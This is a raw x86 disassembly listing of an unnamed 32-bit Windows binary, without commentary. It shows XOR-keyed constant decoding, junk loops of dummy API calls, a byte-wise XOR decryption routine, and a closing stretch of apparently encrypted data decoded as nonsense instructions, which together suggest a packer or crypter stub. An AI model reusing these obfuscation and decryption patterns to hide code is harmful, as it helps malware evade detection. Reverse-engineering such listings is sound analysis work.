  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41d3dc
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41d260,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41d4b4,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41d260
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41d3dc
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41d4b4
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41d260
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41d3dc
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41d460,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41d458,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41d3dc
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x42601c
  410baa:	or     DWORD PTR ds:0x425008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x42800c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x42800c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x42800c,ecx
  410be0:	cmp    DWORD PTR ds:0x42800c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x42800c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x41ff8d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42104c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41d25c
  410c2b:	sbb    DWORD PTR ds:0x42801c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x426004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x426004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x426004,ecx
  410c4d:	cmp    DWORD PTR ds:0x426004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x421014
  410c65:	cmp    DWORD PTR ds:0x426004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x425024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x425024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x425024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x421018
  410ca1:	cmp    DWORD PTR ds:0x425024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x425024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x425024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x425024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x425024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41d464
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x42601c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x42900c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x42900c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x42900c,ecx
  410d03:	cmp    DWORD PTR ds:0x42900c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42101c
  410d24:	cmp    DWORD PTR ds:0x42900c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x42900c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x42900c,ecx
  410d40:	cmp    DWORD PTR ds:0x42900c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x429010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41d3dc
  410d65:	sbb    DWORD PTR ds:0x428018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42501c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x428018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x428018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x428018,ecx
  410da6:	cmp    DWORD PTR ds:0x428018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x428018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x41ffef
  410dc5:	push   0x41ffd1
  410dca:	call   DWORD PTR ds:0x421050
  410dd0:	cmp    DWORD PTR ds:0x428018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x428018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x428018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x426000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x427000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x429010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x425020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x429010,0x17
  410e47:	cmp    DWORD PTR ds:0x429010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x429010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x421054
  410e6f:	cmp    DWORD PTR ds:0x429010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x429010
  410e81:	dec    eax
  410e82:	mov    ds:0x429010,eax
  410e87:	mov    eax,ds:0x429010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x429010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x429004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x429004
  410eab:	inc    eax
  410eac:	mov    ds:0x429004,eax
  410eb1:	cmp    DWORD PTR ds:0x429004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x429004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x42801c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x421058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x429014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x425000,0x42600c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x42900c,0x426014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x426008,0x425014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x427018,0x426018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x426004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x429010,0x42501c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x425020,0x427018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42501c,0x425000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x429010,0x1047
  410f77:	mov    eax,ds:0x41d3fc
  410f7c:	and    DWORD PTR ds:0x425018,0x428010
  410f86:	push   0x41d352
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x427000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x425008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x429010,0x42900c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x425010,0x425014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x428018,0x42900c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x427000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x426008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x426008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x426008,ebx
  410ff5:	cmp    DWORD PTR ds:0x426008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x42900c
  411007:	push   0x429010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42105c
  411017:	cmp    DWORD PTR ds:0x426008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x426004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x426004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x426004,ebx
  41103d:	cmp    DWORD PTR ds:0x426004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x421020
  41105d:	cmp    DWORD PTR ds:0x426004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x427018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x428018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41d1f8
  411086:	mov    ebx,DWORD PTR ds:0x41d1fc
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x426018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x426018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x426018,ebx
  4110b0:	cmp    DWORD PTR ds:0x426018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x426018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x421028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x429004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x427004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x427004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x427004,ebx
  411104:	cmp    DWORD PTR ds:0x427004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x41ff2e
  411116:	call   DWORD PTR ds:0x42102c
  41111c:	cmp    DWORD PTR ds:0x427004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x427004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x427004,ebx
  411136:	cmp    DWORD PTR ds:0x427004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x428014
  41114a:	sbb    DWORD PTR ds:0x425000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0xc92ee4d3
  411322:	fs push edi
  411324:	mov    fs,WORD PTR [edx+0x62]
  411327:	int    0x5f
  411329:	bound  esp,QWORD PTR [edx-0x74]
  41132c:	adc    DWORD PTR [ebx+esi*1+0x2b03602b],esp
  411333:	push   edi
  411334:	inc    esi
  411335:	inc    eax
  411336:	(bad)  
  411337:	cli    
  411338:	fild   WORD PTR [edx+0x492599e2]
  41133e:	xor    bh,dl
  411340:	mov    ecx,0xd4580f21
  411345:	sbb    DWORD PTR [ebx*4-0x1457c7fd],ebx
  41134c:	xchg   ebp,eax
  41134d:	add    al,0x87
  41134f:	retf   0x60b0
  411352:	js     0x411302
  411354:	out    dx,al
  411355:	imul   esp,DWORD PTR [ebx+eiz*2-0x6c],0xa5e7cc69
  41135d:	les    ebp,FWORD PTR ds:0x470c21ad
  411363:	mov    ds:0x900b5787,al
  411368:	das    
  411369:	xor    al,0x39
  41136b:	scas   eax,DWORD PTR es:[edi]
  41136c:	or     eax,0xb90e794d
  411371:	repnz retf 0x1ed6
  411375:	dec    esi
  411376:	cmc    
  411377:	adc    DWORD PTR [ebp+ebx*2+0x5cfb93a9],edi
  41137e:	in     eax,dx
  41137f:	mov    bh,0x4b
  411381:	xlat   BYTE PTR ds:[ebx]
  411382:	and    ecx,DWORD PTR [ebx]
  411384:	jg     0x411370
  411386:	mov    bh,BYTE PTR ss:[ebx+edx*4-0x17]
  41138b:	cmp    ecx,DWORD PTR [edx]
  41138d:	sub    al,0x76
  41138f:	popa   
  411390:	ins    DWORD PTR es:[edi],dx
  411391:	lahf   
  411392:	leave  
  411393:	cld    
  411394:	adc    al,0x50
  411396:	gs push esi
  411398:	loop   0x4113a0
  41139a:	retf   
  41139b:	push   ds
  41139c:	inc    ebp
  41139d:	adc    edx,edx
  41139f:	pop    edx
  4113a0:	inc    esp
  4113a1:	or     DWORD PTR [esi-0x3dcc07e9],edx
  4113a7:	into   
  4113a8:	xchg   edx,eax
  4113a9:	ds and eax,eax
  4113ac:	xchg   ecx,eax
  4113ad:	nop
  4113ae:	call   0x269feff2
  4113b3:	push   ebp
  4113b4:	ss into 
  4113b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113b7:	add    al,0x61
  4113b9:	mov    fs,WORD PTR [eax-0x6f2bcc85]
  4113bf:	aam    0x79
  4113c1:	mov    eax,ds:0x103f0b08
  4113c6:	push   ds
  4113c7:	mov    al,0xdd
  4113c9:	aam    0xab
  4113cb:	daa    
  4113cc:	jnp    0x4113c0
  4113ce:	je     0x4113fe
  4113d0:	and    ch,ch
  4113d2:	pop    ebx
  4113d3:	ret    
  4113d4:	mov    eax,0x9ebb2c96
  4113d9:	icebp  
  4113da:	jbe    0x411378
  4113dc:	dec    esi
  4113de:	scas   eax,DWORD PTR es:[edi]
  4113df:	popa   
  4113e0:	leave  
  4113e1:	or     BYTE PTR [edx-0x66],al
  4113e4:	mov    eax,ds:0x1de92a3a
  4113e9:	popf   
  4113ea:	dec    eax
  4113eb:	mov    ebx,0xe54f4e10
  4113f0:	jmp    0x389b4493
  4113f5:	pop    ss
  4113f6:	scas   eax,DWORD PTR es:[edi]
  4113f7:	jae    0x411471
  4113f9:	je     0x411387
  4113fb:	pushf  
  4113fc:	mov    ds:0x6452072,eax
  411401:	test   eax,0x72a9640e
  411406:	test   al,0x7d
  411408:	dec    edx
  411409:	fst    QWORD PTR [eax-0x387f3895]
  41140f:	bound  ebx,QWORD PTR [eax+edx*8+0x44d8c888]
  411416:	mov    esp,0x7243f70e
  41141b:	sar    dh,cl
  41141d:	xlat   BYTE PTR ds:[ebx]
  41141e:	and    DWORD PTR [ebp+ebp*4-0x1a],eax
  411422:	aaa    
  411423:	sub    eax,DWORD PTR [edx-0x7f]
  411426:	jne    0x4113f4
  411428:	(bad)  
  411429:	popa   
  41142a:	or     ah,BYTE PTR [edi+eiz*4+0x65]
  41142e:	inc    edx
  41142f:	pop    ecx
  411430:	popf   
  411431:	pushf  
  411432:	xchg   esp,eax
  411433:	fdivp  st(3),st
  411435:	mov    al,0xe
  411437:	loopne 0x411489
  411439:	pop    edx
  41143a:	gs es jno 0x41144a
  41143e:	(bad)  
  41143f:	fiadd  WORD PTR [edx]
  411441:	jmp    0x4113e3
  411443:	sbb    DWORD PTR [edi],edi
  411445:	jb     0x41145d
  411447:	mov    cl,0xa7
  411449:	cmp    BYTE PTR [esi-0x1a],ch
  41144c:	pop    eax
  41144d:	xchg   ebp,eax
  41144e:	pop    es
  41144f:	dec    esp
  411450:	int    0xa8
  411452:	mov    al,ds:0x280721d6
